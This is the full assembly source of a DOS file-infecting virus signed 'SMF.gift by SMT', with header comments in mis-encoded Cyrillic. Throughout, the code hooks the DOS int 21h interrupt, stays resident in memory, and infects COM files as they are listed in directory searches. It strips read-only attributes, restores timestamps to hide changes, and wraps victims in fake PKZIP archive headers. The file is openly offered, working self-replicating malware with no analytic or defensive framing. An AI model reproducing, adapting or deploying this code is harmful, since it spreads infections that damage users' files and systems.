   ; ===================== SMF.gift by SMT //SMF ==============================
   ; I am sorry for 386 code :(
   ;
   ; +com-trivial-à¥§¨¤¥â-¥¯®«¨¬®àä:(, ¯®à ¦ ¥â com-ä ©«ë ¯à¨ «î¡®¬ ¤®áâã¯¥ ª ¨¬
   ;   (¯®à ¦ ¥â ä ©«, á ª®â®àë¬ à ¡®â ¥â DOS)
   ;   ¨§ ¯®¤ DOS/NC/VC, ¢ â.ç. ¨ ç¥à¥§ FindNext(*à®á¬®âà ª â «®£  ¢ VolcovCommander)
   ; +* á¯®«§ ¥âáï ®ç-ç¥ì ¡ëáâà® :( ®á®¡¥® ¯® ¬®¥© â çª¥ :)
   ; -*¥ ¯®à ¦ ¥â ¨§-¯®¤ FAR'a ¢¢¨¤ã ¥£® 32-bit ®¡à é¥¨ï ª ä ©« ¬ (® à¥§¨¤¥â
   ;   ãáâ  ¢«¨¢ ¥âáï, ¨ ¯à¨ § ¯ãáª¥ DOS-ãâ¨«¨â ä ©«ë ¯®à ¦ îâáï)
   ; +‡ à ¦ ¥â Read/Only (ä ©«ë,¥ ¤¨áª¨:), á®åà ï¥â  âà¨¡ãâë,¤ âã/¢à¥¬ï á®§¤ ¨ï
   ; +*à¥®¡à §ã¥â ä ©«ë ¢ áâ ¤ àâë© PkZip- àå¨¢,¢ãâà¨ ª®â®à®£®
   ;    å®¤¨âáï á®¡áâ¢¥® ¦¥àâ¢  :))))
   ; +*à®¢¥àª    exe-ä ©«ë ¢ com-ä®à¬ â¥
   ; +*à¨áãâáâ¢ã¥â ¤ ¦¥ ¯à®¢¥àª    ¯®¢â®à®¥ § à ¦¥¨¥!
   ; +*à¨ á¢®¨å ¬®£®ç¨á«¥ëå äãªæ¨ïå ¨  ¢®à®â å § ¨¬ ¥â ¢á¥£®-â® ¥áª®«ìª®
   ;   á®â¥ ¡ ©â.
   ; -*®ª  ¥ ¯®¤áç¨âë¢ ¥âáï CRC, â.ª. íâ® § ©¬¥â çãâì ¡®«¥¥ ª¨«®¡ ©â 
   ;   (¨áå®¤¨ª CRC ¯à¨« £ ¥âáï)
   ; -*®¤ ZipMagic95/98 á®¢á¥¬ ¥ à ¡®â ¥â (çâ® ¨ á«¥¤®¢ «® ®¦¨¤ âì)

   .model tiny
   .code
   .386
           org 0fff0h
   High1   label   ; maximal com-file
       org 100h
   Start:  dd 04034b50h    ; PKZIP file record
       dw 0ah,0,0
           jmp short RealStart
           dw 266ah
           dd CRC  ; crc?
   len1    dd viclen
   len2    dd viclen
       dw 0ch
           dw virlen
           db 'SMF_Gift.com'
   RealStart:
           sub [bx+si],al ; restore results of dummy code in PK-header
           sub [bx+si],al ; restore results of dummy code in PK-header
       pop ax  ; restore results of dummy code in PK-header
       mov eax,'GIFT'
           int 21h ; check if we are already resident
       cmp eax,'DONE'
           jz short VcStart
           push es ds
           mov ax,cs
           dec ax
           mov ds,ax   ; get segment of MCB
       sub word ptr ds:[3],(65536-100h)/16 ; allocate 64K for virus :)
       inc ax
           add ax,word ptr ds:[3]  ; calculate segment address for TSR
           mov es,ax
           mov si,100h
           xor di,di
           mov ds,di
           mov dx,ax
           sub dx,10h  ; dx=segment of TSR, addressable by offset 100h
           shl edx,16
           mov dx,offset Intr21
           xchg edx,ds:[84h]   ; addr. of int21 vector
           pop ds
           mov ds:[Old21],edx
           mov cx,virend-Start
           rep movsb
           pop es
   VcStart:mov si,offset Victim
       mov di,100h
           mov cx,High1-Victim ; maximum possible victim length
           mov eax,0c3a4f3h    ; opcodes for "rep movsb,retn"
           mov ds:[0fch],eax
           push 100h
           push 0fch
           retn    ; run victim's code

   ; ================ NEW int21 handler =======================
   Intr21: cmp eax,'GIFT'
       jnz short noCheck
           mov eax,'DONE'
           iret
   noCheck:pushf
       pusha
           push ds es
           cmp ah,2fh
           jz skip

           mov ah,2fh
           int 21h ; get search record(DTA) to es:bx
           push es
           pop ds
           mov edx,0
   old_size equ $-4
       mov eax,ds:[bx+18h] ; get date/size
           mov dword ptr cs:[old_size],eax
               ; this trick only to minimize suspicious disk access:
           cmp eax,edx ; if date/time changed from last search, then
           jz skip ; it is another file - let's check it
           mov bp,bx
           add bx,1eh
   scan:   inc bx
           cmp byte ptr ds:[bx],0
           jnz scan    ; search for end of file name
           cmp dword ptr ds:[bx-4],'MOC.'
           jnz skip    ; check for com-file
       cmp word ptr ds:[bp+1ah],0fff0h-virlen-dirlen   ; check file size
           jae skip    ; don't infect long com-files
       mov ax,4301h
           lea dx,[bp+1eh]
           xor cx,cx
           int 21h     ; reset file attributes (for infecting R/O)
       mov ax,3d02h
           int 21h ; open file for Read/Write
       xchg ax,bx
       push cs
           pop ds
           mov ah,3fh
           mov dx,offset Victim
           mov cx,0ffffh
       int 21h ; read file
           cmp word ptr [offset Victim],'M'+100h*'Z' ; check for .exe
           jz short close
           cmp dword ptr [offset Victim],04034b50h ; is it already zip-file ?
           jz short close
           movzx eax,ax
           mov ds:[len1],eax ; set archived file length in zip-directories
           mov ds:[len2],eax
           mov ds:[len3],eax
           mov ds:[len4],eax
           mov dx,ax
           add ax,virlen1
           mov ds:[vSize],eax
           mov si,offset ZipDir
           mov di,offset Victim
           add di,dx
           push es
           push ds
           pop es
           mov cx,dirlen
           rep movsb   ; append zip-directory to end of archive
           pop es      ; (it is located at the end of file)
           mov ax,4200h
           xor dx,dx
           xor cx,cx
           int 21h ; seek to begin of file
       mov cx,di
       mov dx,100h
           sub cx,dx
           mov ah,40h
           int 21h ; write to file
       mov ax,5701h
           mov cx,es:[bp+16h]
           mov dx,es:[bp+18h]
           int 21h ; restore original file time/date
   close:  mov ah,3eh
       int 21h
       mov ax,4301h
           lea dx,[bp+1eh]
           movzx cx,byte ptr es:[bp+15h]
           push es
           pop ds
           int 21h     ; restore old file attributes
   skip:   pop es ds
           popa
           popf
           jmp dword ptr cs:[Old21]
           nop
   Old21   dd 0

   ZipDir  dd 02014b50h    ; PKZIP central directory record
       db 14h,0,0ah,0
           dw 0,0,79adh,266ah
           dd CRC  ; crc?!
   len3    dd viclen
   len4    dd viclen
       dw 0ch,0,0,0,1
           dd 20h,0
           db 'SMF_Gift.com'
           dd 06054b50h
           dw 0,0,1,1
       dd 3ah  ; directory size
   vSize   dd 2ah+virlen+viclen
       dw 0
   dirlen  equ $-ZipDir
   virend  label
   virlen  equ virend-RealStart
   virlen1 equ virlen+2ah
   Victim: ret



   ; ===========================================================================
   ;  !! MESSAGE FOR DUKE!!! MESSAGE FOR DUKE!!! MESSAGE FOR DUKE!!! MESSAGE !!!
       db '[It is an installer for SMF.Gift]'  ; ‚*ˆŒ€*ˆ…! “ç¨âë¢ ï â¢®î
                       ; áª«®®áâì ª ã¬¥ìè¥¨î à §¬¥à®¢ ¢¨àãá®¢,
                                   ; ¬®¦¥èì áíª®®¬¨âì   íâ®© áâà®çª¥ ¡¥§ ¢áïª¨å
                                   ; ¯®â¥àì äãªæ¨® «ì®áâ¨   æ¥«ëå 33 ¡ ©â  !-)
                                   ; å®âï ¯à¨¤¥âáï ¯¥à¥áç¨â âì CRC §¤¥áì:
   CRC equ 0a3806033h
   ; MESSAGE END  MESSAGE END MESSAGE END MESSAGE END MESSAGE END MESSAGE END
   ; ===========================================================================



   viclen  equ $-victim

       dd 02014b50h    ; copy of central directory record
       db 14h,0,0ah,0
           dw 0,0,79adh,266ah
           dd CRC  ; crc?!
       dd viclen
       dd viclen
       dw 0ch,0,0,0,1
           dd 20h,0
           db 'SMF_Gift.com'
           dd 06054b50h
           dw 0,0,1,1
       dd 3ah  ; directory size
       dd 2ah+virlen+viclen
       dw 0

       end Start
